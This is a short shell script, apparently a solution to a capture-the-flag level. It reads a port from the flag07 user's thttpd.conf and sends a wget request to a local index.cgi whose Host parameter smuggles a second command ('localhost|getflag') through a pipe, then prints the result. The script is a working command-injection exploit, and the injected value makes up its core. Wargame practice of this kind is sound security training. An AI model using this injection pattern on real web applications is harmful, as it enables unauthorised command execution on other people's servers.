set -x
port=`awk -F'=' '$1 == "port" { print $2 }' /home/flag07/thttpd.conf`
wget "localhost:${port}/index.cgi?Host=localhost|getflag" -O ~/result
cat ~/result && rm ~/result
exit 0
